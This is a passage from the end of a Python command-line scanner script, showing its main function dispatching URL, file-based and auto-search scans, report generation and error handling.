        signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
        
        app.run(host=args.host, port=args.serve, debug=False, use_reloader=False)
        return
    
    # Execute scan
    results = []
    
    try:
        if args.url:
            result = scanner.scan_target(args.url)
            results.append(result)
        
        if args.file:
            results.extend(scanner.scan_from_file(args.file))
        
        if args.auto_search:
            auto_results = scanner.auto_search_from_file(args.auto_search)
            results.extend(auto_results)
        
        # Generate report
        if results:
            scanner.generate_report(results, args.output)
        else:
            print(f"\n{Colors.WARN}[!] No targets to scan{Colors.RESET}")
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARN}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.CRITICAL}[!] Fatal error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
if __name__ == '__main__':
    main()
